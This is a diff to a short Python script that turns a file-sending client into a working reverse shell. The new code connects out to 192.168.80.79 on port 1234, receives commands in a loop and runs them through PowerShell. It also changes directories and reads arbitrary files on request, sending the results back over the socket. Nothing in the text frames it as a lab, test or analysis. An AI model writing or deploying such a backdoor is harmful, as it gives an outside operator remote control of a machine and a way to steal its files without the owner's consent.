@@ -1,47 +1,43 @@
 import socket
+import subprocess
 import os
 
-SERVER_HOST = 'your_server_ip'  # Server IP address
-SERVER_PORT = 12345  # Server port
 
-# Function to establish a connection to the server
-def connect_to_server():
+def execute_command(command):
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((SERVER_HOST, SERVER_PORT))
-        return s
-    except socket.error as e:
-        print(f"Error connecting to server: {e}")
-        return None
+        if command.startswith("cd"):
+            os.chdir(command[3:].strip())
+            return "Directory changed to " + os.getcwd()
+        elif command.startswith("get"):
+            file_path = command[4:].strip().replace("`", "")
+            if os.path.exists(file_path):
+                with open(file_path, "rb") as file:
+                    return file.read()
+            else:
+                return f"File not found at path: {file_path}"
+        else:
+            output = subprocess.check_output(["powershell", command], shell=True, stderr=subprocess.STDOUT, text=True)
+            return output
+    except subprocess.CalledProcessError as e:
+        return str(e)
 
-# Function to send data to the server
-def send_data(s, data):
-    try:
-        s.send(data)
-    except socket.error as e:
-        print(f"Error sending data: {e}")
 
-# Function to send a file to the server
-def send_file(s, file_path):
-    try:
-        with open(file_path, 'rb') as f:
-            data = f.read()
-            s.send(data)
-    except IOError as e:
-        print(f"Error sending file: {e}")
+def main():
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect(('192.168.80.79', 1234))  # Enter the server's IP address here
 
-if __name__ == '__main__':
-    # Connect to the server
-    server_socket = connect_to_server()
-    if server_socket:
-        current_dir = os.getcwd()
-        # Send the current directory to the server
-        send_data(server_socket, f"Agent connected from {current_dir}")
+    while True:
+        command = client.recv(4096).decode('utf-8')
+        if command.lower() == 'exit':
+            break
 
-        # Define the path of the file to be sent
-        file_path = 'path_to_your_file'  # Replace with the actual file path
-        # Send the file to the server
-        send_file(server_socket, file_path)
+        output = execute_command(command)
+        if isinstance(output, bytes):
+            client.send(output)
+        else:
+            client.send(output.encode('utf-8'))
 
-        # Close the socket connection
-        server_socket.close()
+    client.close()
+
+if __name__ == "__main__":
+    main()
